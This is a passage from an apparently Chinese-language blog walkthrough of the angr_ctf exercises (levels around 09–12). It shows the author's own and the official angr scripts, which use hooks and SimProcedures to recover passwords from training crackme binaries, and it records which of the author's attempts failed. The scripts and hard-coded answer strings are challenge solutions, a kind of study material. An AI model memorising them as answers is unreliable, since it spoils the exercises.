<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x80492FD</span></span><br><span class="line">  initial_state = project.factory.blank_state(</span><br><span class="line">    addr=start_address,</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">  password_address = <span class="number">0x804C038</span></span><br><span class="line">  initial_state.memory.store(password_address, password)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  address_to_check_constraint = <span class="number">0x804934E</span></span><br><span class="line">  simulation.explore(find=address_to_check_constraint)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    constrained_parameter_address = <span class="number">0x804C038</span></span><br><span class="line">    constrained_parameter_size_bytes = <span class="number">16</span></span><br><span class="line">    constrained_parameter_bitvector = solution_state.memory.load(</span><br><span class="line">      constrained_parameter_address,</span><br><span class="line">      constrained_parameter_size_bytes</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    constrained_parameter_desired_value = <span class="string">&#x27;PPBVDNMJABAQHZQQ&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)</span><br><span class="line"></span><br><span class="line">    solution = solution_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line">  start_address = <span class="number">0x804935B</span></span><br><span class="line">  initial_state = project.factory.blank_state(</span><br><span class="line">    addr=start_address,</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">  password_address = <span class="number">0x804C038</span></span><br><span class="line">  initial_state.memory.store(password_address, password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里记得把password初始值写入</span></span><br><span class="line">  pwd_addr = <span class="number">0x804C04C</span></span><br><span class="line">  pwd = <span class="string">b&#x27;PPBVDNMJABAQHZQQ&#x27;</span></span><br><span class="line">  initial_state.memory.store(pwd_addr, pwd)</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  address_to_check_constraint = <span class="number">0x80493A3</span></span><br><span class="line">  simulation.explore(find=address_to_check_constraint)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    constrained_parameter_address = <span class="number">0x804C038</span></span><br><span class="line">    constrained_parameter_size_bytes = <span class="number">16</span></span><br><span class="line">    constrained_parameter_bitvector = solution_state.memory.load(</span><br><span class="line">      constrained_parameter_address,</span><br><span class="line">      constrained_parameter_size_bytes</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    check = solution_state.memory.load(</span><br><span class="line">      pwd_addr,</span><br><span class="line">      constrained_parameter_size_bytes</span><br><span class="line">    )</span><br><span class="line">    constrained_parameter_desired_value = check</span><br><span class="line"></span><br><span class="line">    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)</span><br><span class="line"></span><br><span class="line">    solution = solution_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution???&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<p>然后看看官方怎么 hook 的</p>
<p>结论是这么写将中间那个过不去的函数转化为手动的 check，那比上一个的做法还简洁点点</p>
<p>主要就是这里：</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231024213817285.png" alt="image-20231024213817285"></p>
<p>直接贴一个：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This level performs the following computations:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1. Get 16 bytes of user input and encrypt it.</span></span><br><span class="line"><span class="comment"># 2. Save the result of check_equals_AABBCCDDEEFFGGHH (or similar)</span></span><br><span class="line"><span class="comment"># 3. Get another 16 bytes from the user and encrypt it.</span></span><br><span class="line"><span class="comment"># 4. Check that it&#x27;s equal to a predefined password.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The ONLY part of this program that we have to worry about is #2. We will be</span></span><br><span class="line"><span class="comment"># replacing the call to check_equals_ with our own version, using a hook, since</span></span><br><span class="line"><span class="comment"># check_equals_ will run too slowly otherwise.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Since Angr can handle the initial call to scanf, we can start from the</span></span><br><span class="line">  <span class="comment"># beginning.</span></span><br><span class="line">  initial_state = project.factory.entry_state(</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Hook the address of where check_equals_ is called.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  check_equals_called_address = <span class="number">0x80486ca</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># The length parameter in angr.Hook specifies how many bytes the execution</span></span><br><span class="line">  <span class="comment"># engine should skip after completing the hook. This will allow hooks to</span></span><br><span class="line">  <span class="comment"># replace certain instructions (or groups of instructions). Determine the</span></span><br><span class="line">  <span class="comment"># instructions involved in calling check_equals_, and then determine how many</span></span><br><span class="line">  <span class="comment"># bytes are used to represent them in memory. This will be the skip length.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  instruction_to_skip_length = <span class="number">5</span></span><br><span class="line"><span class="meta">  @project.hook(<span class="params">check_equals_called_address, length=instruction_to_skip_length</span>)</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">skip_check_equals_</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># Determine the address where user input is stored. It is passed as a</span></span><br><span class="line">    <span class="comment"># parameter ot the check_equals_ function. Then, load the string. Reminder:</span></span><br><span class="line">    <span class="comment"># int check_equals_(char* to_check, int length) &#123; ...</span></span><br><span class="line">    user_input_buffer_address = <span class="number">0x804a044</span> <span class="comment"># :integer, probably hexadecimal</span></span><br><span class="line">    user_input_buffer_length = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Reminder: state.memory.load will read the stored value at the address</span></span><br><span class="line">    <span class="comment"># user_input_buffer_address of byte length user_input_buffer_length.</span></span><br><span class="line">    <span class="comment"># It will return a bitvector holding the value. This value can either be</span></span><br><span class="line">    <span class="comment"># symbolic or concrete, depending on what was stored there in the program.</span></span><br><span class="line">    user_input_string = state.memory.load(</span><br><span class="line">      user_input_buffer_address,</span><br><span class="line">      user_input_buffer_length</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Determine the string this function is checking the user input against.</span></span><br><span class="line">    <span class="comment"># It&#x27;s encoded in the name of this function; decompile the program to find</span></span><br><span class="line">    <span class="comment"># it.</span></span><br><span class="line">    check_against_string = <span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span>.encode() <span class="comment"># :string</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gcc uses eax to store the return value, if it is an integer. We need to</span></span><br><span class="line">    <span class="comment"># set eax to 1 if check_against_string == user_input_string and 0 otherwise.</span></span><br><span class="line">    <span class="comment"># However, since we are describing an equation to be used by z3 (not to be</span></span><br><span class="line">    <span class="comment"># evaluated immediately), we cannot use Python if else syntax. Instead, we </span></span><br><span class="line">    <span class="comment"># have to use claripy&#x27;s built in function that deals with if statements.</span></span><br><span class="line">    <span class="comment"># claripy.If(expression, ret_if_true, ret_if_false) will output an</span></span><br><span class="line">    <span class="comment"># expression that evaluates to ret_if_true if expression is true and</span></span><br><span class="line">    <span class="comment"># ret_if_false otherwise.</span></span><br><span class="line">    <span class="comment"># Think of it like the Python &quot;value0 if expression else value1&quot;.</span></span><br><span class="line">    state.regs.eax = claripy.If(</span><br><span class="line">      user_input_string == check_against_string, </span><br><span class="line">      claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), </span><br><span class="line">      claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Since we are allowing Angr to handle the input, retrieve it by printing</span></span><br><span class="line">    <span class="comment"># the contents of stdin. Use one of the early levels as a reference.</span></span><br><span class="line">    solution = solution_state.posix.dumps(sys.stdin.fileno()).decode()</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<h4 id="10_angr_simprocedures"><a class="markdownIt-Anchor" href="#10_angr_simprocedures">#</a> 10_angr_simprocedures</h4>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231025094815541.png" alt="image-20231025094815541"></p>
<p>将 check 部分的 basic block 拆了很多很多，看源码是加了不透明谓词和分发块：</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231025094941057.png" alt="image-20231025094941057"></p>
<p>ida 做了的伪代码做了代码优化，看起来其实和前面两个题差不多</p>
<p>但是下面这种写法不行，不知道是为啥不能这样 hook，这样 hook 的话约束不出来解：</p>
<p>（先 hook 找输入的地址，然后手写 check，但是约束不出来，跑出来空解）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">user_input_buffer_address = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(path_to_binary)</span><br><span class="line">    </span><br><span class="line">    password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x8049310</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">skip_check_equals_</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">global</span> user_input_buffer_address</span><br><span class="line">        user_input_buffer_address = state.solver.<span class="built_in">eval</span>(state.regs.eax)</span><br><span class="line">        state.memory.store(user_input_buffer_address, password)</span><br><span class="line"></span><br><span class="line">    check_equals_called_address = <span class="number">0x8049362</span></span><br><span class="line">    simulation = project.factory.simgr()</span><br><span class="line">    simulation.explore(find=check_equals_called_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        check_against_string = <span class="string">b&#x27;PPBVDNMJABAQHZQQ&#x27;</span></span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        user_input_string = solution_state.memory.load(</span><br><span class="line">            user_input_buffer_address,</span><br><span class="line">            <span class="number">16</span></span><br><span class="line">        )</span><br><span class="line">        solution_state.add_constraints(user_input_string == check_against_string)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(solution_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>).decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>
<p>看看官方的吧：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state(</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">ReplacementCheckEquals</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, to_check, length</span>):</span><br><span class="line">      user_input_buffer_address = to_check</span><br><span class="line">      user_input_buffer_length = length</span><br><span class="line"></span><br><span class="line">      user_input_string = self.state.memory.load(</span><br><span class="line">        user_input_buffer_address,</span><br><span class="line">        user_input_buffer_length</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      check_against_string = <span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> claripy.If(</span><br><span class="line">        user_input_string == check_against_string,</span><br><span class="line">        claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),</span><br><span class="line">        claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">  check_equals_symbol = <span class="string">&#x27;check_equals_OSIWHBXIFOQVSBZB&#x27;</span> <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution = solution_state.posix.dumps(sys.stdin.fileno()).decode()</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<p>定义一个类，遇到 check 函数后直接 hook 并且跳过</p>
<p>简写<s>偷</s>一个，方便看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCheckEquals</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, buffer_addr, length</span>):</span><br><span class="line">        buffer = self.state.memory.load(buffer_addr, length)</span><br><span class="line">        <span class="keyword">return</span> claripy.If(buffer == <span class="string">b&#x27;PPBVDNMJABAQHZQQ&#x27;</span>, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>)</span><br><span class="line">proj.hook_symbol(symbol_name=<span class="string">&#x27;check_equals_PPBVDNMJABAQHZQQ&#x27;</span>, simproc=MyCheckEquals())</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><s>所以为啥我的跑不通</s></p>
<h4 id="11_angr_sim_scanf"><a class="markdownIt-Anchor" href="#11_angr_sim_scanf">#</a> 11_angr_sim_scanf</h4>
<p>看起来比上个还过分一点</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231026160856414.png" alt="image-20231026160856414"></p>
<p>看起来是很多 <code>scanf</code>  了</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231026161037670.png" alt="image-20231026161037670"></p>
<p>这个从源程序看起来可以直接手动 check 秒掉，还是小写一个</p>
<p>（然后其实 check 也是不必要的，就这样 hook 就行）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">user_input_buffer_address = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pwd = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params"><span class="number">0x80492D7</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">skip_check_equals_</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">global</span> user_input_buffer_address, tmp, pwd</span><br><span class="line">        user_input_buffer_address = state.solver.<span class="built_in">eval</span>(state.regs.eax)</span><br><span class="line">        tmp += <span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(state.memory.load(user_input_buffer_address,<span class="number">1</span>)))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(tmp) &gt; <span class="number">6</span>):            </span><br><span class="line">            tmp = [tmp[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp) - <span class="number">2</span>, -<span class="number">1</span> ,-<span class="number">2</span>)]</span><br><span class="line">            tmp = <span class="string">&#x27;&#x27;</span>.join(tmp)</span><br><span class="line">            pwd.append(<span class="built_in">int</span>(tmp, <span class="number">16</span>))</span><br><span class="line">            tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    check_equals_called_address = <span class="number">0x80492E1</span></span><br><span class="line">    simulation = project.factory.simgr()</span><br><span class="line">    simulation.explore(find=check_equals_called_address)</span><br><span class="line">    <span class="built_in">print</span>(pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>
<p>来看看这题想考怎么个事</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># This time, the solution involves simply replacing scanf with our own version,</span><br><span class="line"># since Angr does not support requesting multiple parameters with scanf.</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>其实可以打通的，结论是 angr 在不断进步～～，楽～～</p>
<p>不过这题还是想跟你说说 hook 系统函数的方法，其实也就是 hook 一下符号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This time, the solution involves simply replacing scanf with our own version,</span></span><br><span class="line"><span class="comment"># since Angr does not support requesting multiple parameters with scanf.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state(</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">ReplacementScanf</span>(angr.SimProcedure):</span><br><span class="line">    <span class="comment"># Finish the parameters to the scanf function. Hint: &#x27;scanf(&quot;%u %u&quot;, ...)&#x27;.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, format_string, scanf0_address, scanf1_address</span>):</span><br><span class="line">      <span class="comment"># Hint: scanf0_address is passed as a parameter, isn&#x27;t it?</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># The scanf function writes user input to the buffers to which the </span></span><br><span class="line">      <span class="comment"># parameters point.</span></span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Now, we want to &#x27;set aside&#x27; references to our symbolic values in the</span></span><br><span class="line">      <span class="comment"># globals plugin included by default with a state. You will need to</span></span><br><span class="line">      <span class="comment"># store multiple bitvectors. You can either use a list, tuple, or multiple</span></span><br><span class="line">      <span class="comment"># keys to reference the different bitvectors.</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>] = scanf0</span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>] = scanf1</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again.&#x27;</span>.encode() <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Grab whatever you set aside in the globals dict.</span></span><br><span class="line">    stored_solutions0 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>]</span><br><span class="line">    stored_solutions1 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>]</span><br><span class="line">    solution = <span class="string">f&#x27;<span class="subst">&#123;solution_state.solver.<span class="built_in">eval</span>(stored_solutions0)&#125;</span> <span class="subst">&#123;solution_state.solver.<span class="built_in">eval</span>(stored_solutions1)&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>
<h4 id="12_angr_veritesting"><a class="markdownIt-Anchor" href="#12_angr_veritesting">#</a> 12_angr_veritesting</h4>
<p>？？？为什么又 hook 不成功了（这里因为代码又变了，想做一些新的尝试）</p>
<p>↓失败的代码</p>
